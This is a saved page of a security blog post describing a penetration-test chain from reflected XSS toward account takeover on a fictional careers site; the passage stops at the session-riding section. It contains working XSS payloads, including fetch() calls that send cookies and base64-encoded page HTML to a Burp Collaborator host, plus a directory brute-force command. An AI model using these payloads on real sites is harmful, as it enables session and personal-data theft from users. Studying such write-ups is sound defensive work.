<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><link rel="icon" href="/favicon.ico"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><title>xbz0n@sh:~# <!-- -->XSS to Account Takeover &amp; Data Exfiltration</title><meta name="description" content="Cross-Site Scripting (XSS) vulnerabilities continue to plague web applications despite being well-understood for decades. While they might seem simple on the..."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xbz0n.sh/blog/XSS-to-Account-Takeover-and-Data-Exfiltration"/><meta property="og:title" content="XSS to Account Takeover &amp; Data Exfiltration"/><meta property="og:description" content="Cross-Site Scripting (XSS) vulnerabilities continue to plague web applications despite being well-understood for decades. While they might seem simple on the..."/><meta property="og:image" content="https://xbz0n.sh/images/xss-account-takeover.jpeg"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image:alt" content="XSS to Account Takeover &amp; Data Exfiltration"/><meta property="twitter:card" content="summary_large_image"/><meta property="twitter:url" content="https://xbz0n.sh/blog/XSS-to-Account-Takeover-and-Data-Exfiltration"/><meta property="twitter:title" content="XSS to Account Takeover &amp; Data Exfiltration"/><meta property="twitter:description" content="Cross-Site Scripting (XSS) vulnerabilities continue to plague web applications despite being well-understood for decades. While they might seem simple on the..."/><meta property="twitter:image" content="https://xbz0n.sh/images/xss-account-takeover.jpeg"/><meta property="image" content="https://xbz0n.sh/images/xss-account-takeover.jpeg"/><meta property="author" content="Ivan Spiridonov"/><link rel="canonical" href="https://xbz0n.sh/blog/XSS-to-Account-Takeover-and-Data-Exfiltration"/><meta name="next-head-count" content="24"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><link rel="preload" href="/_next/static/css/be284b2f70ed0068.css" as="style"/><link rel="stylesheet" href="/_next/static/css/be284b2f70ed0068.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-ee7e63bc15b31913.js" defer=""></script><script src="/_next/static/chunks/framework-64ad27b21261a9ce.js" defer=""></script><script src="/_next/static/chunks/main-0a3c670da7f1f1eb.js" defer=""></script><script src="/_next/static/chunks/pages/_app-6f140346224d0b31.js" defer=""></script><script src="/_next/static/chunks/676-8a913a0c6948fe82.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5Bslug%5D-80e53230ab478c73.js" defer=""></script><script src="/_next/static/EJgAsPo3Kz3qeohT_5Phd/_buildManifest.js" defer=""></script><script src="/_next/static/EJgAsPo3Kz3qeohT_5Phd/_ssgManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap">@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKxjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8-qxjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8L6tjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next"><div class="flex flex-col min-h-screen"><nav class="bg-primary/80 backdrop-blur-sm sticky top-0 z-10 shadow-md"><div class="container py-4"><div class="flex items-center justify-between"><div class="flex items-center space-x-6"><a href="/"><span class="text-xl font-bold tracking-tighter bg-gradient-to-r from-accent to-blue-500 bg-clip-text text-transparent">xbz0n@sh:~#</span></a><div class="hidden md:flex space-x-6"><a class="nav-link" href="/">Home</a><a class="nav-link" href="/about">About</a><a class="nav-link" href="/blog">Blog</a><a class="nav-link" href="/tools">Tools</a><a class="nav-link" href="/cves">CVEs</a></div></div><div class="hidden md:flex items-center space-x-4"><a href="mailto:ivanspiridonov@gmail.com" class="text-gray-300 hover:text-accent" aria-label="Email"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path></svg></a><a href="https://github.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="GitHub"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a><a href="https://twitter.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="Twitter"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a><a href="https://www.linkedin.com/in/ivanspiridonov/" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="LinkedIn"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z"></path></svg></a><a href="https://app.hackthebox.com/public/users/8208" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="HackTheBox"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><title></title><path d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z"></path></svg></a></div><button class="md:hidden focus:outline-none" aria-label="Toggle menu"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="h-6 w-6 text-gray-300" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg></button></div></div></nav><main class="flex-grow container py-8"><article class="max-w-3xl mx-auto"><a class="text-accent hover:text-accent/80 mb-8 inline-block" href="/blog">‚Üê Back to all posts</a><div class="mb-8"><h1 class="text-3xl md:text-4xl font-bold mb-4">XSS to Account Takeover &amp; Data Exfiltration</h1><div class="flex items-center text-sm text-gray-400"><time dateTime="2025-04-24">April 24, 2025</time></div></div><div class="blog-content">
<p><img src="/images/xss-account-takeover.jpeg" alt="Cross-site scripting"></p>
<h2>Introduction</h2>
<p>Cross-Site Scripting (XSS) vulnerabilities continue to plague web applications despite being well-understood for decades. While they might seem simple on the surface, the impact of XSS can be devastating when chained with other attack techniques.</p>
<p>In this article, I'll walk through a real-world example of how a seemingly innocent XSS vulnerability was leveraged to achieve full account takeover and sensitive data exfiltration. We'll explore the complete attack chain - from initial discovery to exploitation - demonstrating how attackers can pivot from a basic reflected XSS to stealing Social Security Numbers, personal information, and ultimately taking control of user accounts.</p>
<p>The beauty of this attack chain lies in its simplicity and effectiveness. By finding an unprotected endpoint with XSS, then combining it with session riding techniques, we were able to bypass modern browser protections and achieve multiple high-impact objectives with minimal effort.</p>
<h2>Important Disclaimer !</h2>
<p><strong>All company names, domains, URLs, and personal data presented in this article are entirely fictional.</strong></p>
<p>While the attack methodology and techniques described are based on a real-world security assessment, all identifying details have been completely changed to protect confidentiality. The vulnerabilities described have since been remediated by the affected organization. This article is published for educational purposes only.</p>
<h2>Prerequisites</h2>
<ul>
<li>A web proxy for intercepting/modifying requests (like Burp Suite)</li>
<li>Basic knowledge of Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF)</li>
</ul>
<h2>1. Discovering the Vulnerability</h2>
<p>The first step in any security assessment is thorough reconnaissance. Using directory brute forcing tools like dirb or gobuster can often reveal hidden endpoints that aren't linked from the main application interface.</p>
<pre class="language-bash"><code class="language-bash">$ dirb https://crosssitecorp.com /usr/share/wordlists/dirb/common.txt
</code></pre>
<p>During our assessment, we discovered an interesting endpoint at <code>/HR/Career.aspx</code> that accepted a <code>Client</code> parameter and several other query parameters. This caught our attention because:</p>
<ol>
<li>It wasn't linked from the main application</li>
<li>It accepted multiple user-controlled parameters</li>
</ol>
<p>We decided to test for XSS by injecting a simple payload into one of the parameters. During our testing, we discovered some filtering mechanisms were in place:</p>
<ul>
<li>Using the equals sign (<code>=</code>) in our payload resulted in HTTP 500 errors</li>
<li>Single quotes (<code>'</code>) were being filtered out of our input</li>
<li>Some standard XSS payloads were blocked by the application</li>
</ul>
<p>Through trial and error, we found a payload pattern that bypassed these filters:</p>
<pre class="language-none"><code class="language-none">https://crosssitecorp.com/HR/Career.aspx?Client=COMPANY123&#x26;xxFxx">&#x3C;script>alert(1)&#x3C;/script>jifk0=1
</code></pre>
<p>To our surprise, the application reflected our payload directly into the page's HTML without proper sanitization:</p>
<pre class="language-html"><code class="language-html">&#x3C;meta http-equiv="X-UA-Compatible" content="IE=9" />
&#x3C;link rel='Icon' href='/images/logo.png' />
&#x3C;meta property="og:url" content="https://crosssitecorp.com/HR/Career.aspx?Client=COMPANY123&#x26;xxFxx">&#x3C;script>alert(1)&#x3C;/script>jifk0=1" />&#x3C;meta property="og:title" content="Cross Site Corp Careers" />&#x3C;meta property="og:description" content="Cross Site Corp Careers" />
</code></pre>
<p>The alert box popped, confirming we had found a viable XSS vulnerability despite the partial filtering. But how severe was it? Could we leverage it to do something more impactful than just displaying an alert box?</p>
<h2>2. Assessing the Impact</h2>
<p>With XSS confirmed, we needed to evaluate what we could access within the context of the vulnerable page. Our first thought was to try to extract cookies that might contain session information.</p>
<p>To capture the exfiltrated data, we set up a Burp Collaborator client, which provides a unique subdomain (in our case, "k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com") that can capture HTTP/DNS interactions. This allowed us to collect data without setting up a separate server infrastructure.</p>
<pre class="language-javascript"><code class="language-javascript">// Attempt to extract cookies
fetch("https://k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com/" + document.cookie)
</code></pre>
<p>We crafted the following payload to send cookies to our collection server:</p>
<pre class="language-none"><code class="language-none">https://crosssitecorp.com/HR/Career.aspx?Client=COMPANY123&#x26;wd">&#x3C;script>fetch("https://k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com/" + document.cookie)&#x3C;/script>jifk0=1
</code></pre>
<p>When the victim's browser executed our payload, Burp Collaborator captured the HTTP request containing the cookies:</p>
<pre class="language-http"><code class="language-http">GET /IsSessionActive=true;_ga=GA1.2.1809283711.1683748940;_gid=GA1.2.1672134812.1683748940;_fbp=fb.1.1683748940623.957356889 HTTP/1.1
Host: k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: */*
</code></pre>
<p>Upon examining the requests more closely in Burp Suite, we discovered that the authentication cookies were protected with the <code>HttpOnly</code> flag, preventing JavaScript from accessing them:</p>
<pre class="language-http"><code class="language-http">Set-Cookie: .AUTH=F2AD67B9FC03A2B9A802F24C8C32A5FB8; path=/; HttpOnly; Secure; SameSite=Lax
</code></pre>
<p>This meant we couldn't simply steal the authentication cookies via JavaScript. We needed a different approach.</p>
<h2>3. Expanding Our Testing</h2>
<p>Since direct cookie theft wasn't possible, we tried to extract the page's HTML content to see if there was any sensitive information or potential attack vectors. Again, we used our Burp Collaborator endpoint to capture the exfiltrated data:</p>
<pre class="language-none"><code class="language-none">https://crosssitecorp.com/HR/Career.aspx?Client=COMPANY123&#x26;wd">&#x3C;script>fetch("https://k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com/dom?html=" + btoa(document.documentElement.innerHTML))&#x3C;/script>jifk0=1
</code></pre>
<p>Burp Collaborator captured the base64-encoded HTML of the page:</p>
<pre class="language-http"><code class="language-http">GET /dom?htmlPGhlYWQ+PGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iL0RYUi5heGQ/cj0xXzEyLDFfNSwxXzMtQTNvQnUiPjx0aXRsZT4KCUNyb3NzIFNpdGUgQ29ycCBDYXJlZXJzIEpvYiBPcGVuaW5ncwkKPC90aXRsZT48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgogICAgICAgIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9OSI+CiAgICAgICAgPGxpbmsgcmVsPSJDb21wYW55IEljb24iIGhyZWY9Ii9pbWFnZXMvbG9nby5wbmciPgogICAgICAgIDxtZXRhIHByb3BlcnR5PSJvZzp1cmwiIGNvbnRlbnQ9Imh0dHBzOi8vY3Jvc3NzaXRlY29ycC5jb20vam9icy9jYXJlZXIuYXNweA... HTTP/1.1
Host: k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com
Accept: */*
</code></pre>
<p>The advantage of using Burp Collaborator is that it provides a complete log of all interactions, including headers and request parameters, which helped us analyze the exfiltrated data more effectively. It also doesn't require setting up a separate server infrastructure, making it an ideal tool for security assessments.</p>
<p>When decoded, the base64 data revealed the following HTML structure:</p>
<pre class="language-html"><code class="language-html">&#x3C;head>&#x3C;link rel="stylesheet" type="text/css" href="/DXR.axd?r=1_12,1_5,1_3-A3oBu">&#x3C;title>
	Cross Site Corp Careers	
&#x3C;/title>&#x3C;meta name="viewport" content="width=device-width, initial-scale=1">
        &#x3C;meta http-equiv="X-UA-Compatible" content="IE=9">
        &#x3C;link rel="Company Icon" href="/images/logo.png">
        &#x3C;meta property="og:url" content="https://crosssitecorp.com/HR/Career.aspx?Client=COMPANY123&#x26;wd">&#x3C;script>fetch("https://k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com/dom?html="+btoa(document.documentElement.innerHTML))&#x3C;/script>jifk0=1">
        &#x3C;meta property="og:title" content="Cross Site Corp Careers">
        &#x3C;meta property="og:description" content="Cross Site Corp Careers">
&#x3C;/head>
</code></pre>
<p>This confirmed our injection point was in the meta tags within the document head, limiting our visibility of the full DOM structure.</p>
<h2>4. Session Riding: The Key to Escalation</h2>
